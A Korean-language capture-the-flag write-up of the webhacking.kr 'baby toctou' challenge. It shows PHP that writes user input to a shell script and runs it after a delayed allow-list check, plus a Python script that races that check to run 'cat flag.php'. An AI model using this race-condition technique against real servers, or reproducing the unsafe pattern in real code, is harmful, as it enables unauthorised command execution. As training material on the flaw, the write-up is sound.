---
title: ["[Webhacking.kr] baby toctou🍼 (race condition - 50)"]
date: 2024-12-01 09:00:00 +0900
categories: [writeup, webhacking.kr]
tags: [web, race condition, toctou]
---

```php
<?php
  // system($_GET['q']);
  if(!preg_match('/^[a-f0-9]+$/',$_COOKIE['baby_toctou'])){ $newCookie = uniqid().rand(1,999999999); setcookie("baby_toctou",$newCookie); $_COOKIE['baby_toctou'] = $newCookie; }
  $cmd = $_GET['q'];
  $myfile = fopen("user/{$_COOKIE['baby_toctou']}.sh", "w") or die("Unable to open file!");
  fwrite($myfile, $cmd);
  fclose($myfile);
  if(($cmd === "ls") || ($cmd === "cat api.php") || ($cmd === "cat index.php")){ // valid check
    sleep(1); // my server is small and weak
    system("sh ./user/{$_COOKIE['baby_toctou']}.sh");
  }
  else{
    echo <<<HELP
only "ls", "cat api.php", "cat index.php" allowed
HELP;
  }
?>
```

`TOCTOU`는 Time of Check to Time of Use의 약자이다.  

`.sh` 파일을 쓰고 실행하는 사이에 `sleep(1)` 1초의 간격이 있다.  
이 시간동안 파일 내용을 변경할 수 있다.  

old-60 문제와 거의 똑같은 문제인 셈이다.  

```python
import requests
import threading
import time

url = "http://webhacking.kr:10019/api.php"  
cookies = {"baby_toctou":"675279788a09d467354543"}

def write_exploit():
    count = 0
    while True:
        try:
            requests.get(f"{url}?q=cat+flag.php", 
                         cookies=cookies)
            count += 1
            print(f"[+] Create file attempt #{count}")
            time.sleep(0.1)
        except:
            pass


ex = threading.Thread(target=write_exploit)
ex.daemon = True
ex.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[!] Stopping exploit")
```

Python으로 계속 `.sh` 파일에 `cat flag.php`를 작성하면서,  
같은 쿠키 값을 가진 다른 브라우저에서 필터를 통과할 수 있는 명령어인 `ls`를 실행하면 flag를 볼 수 있다.  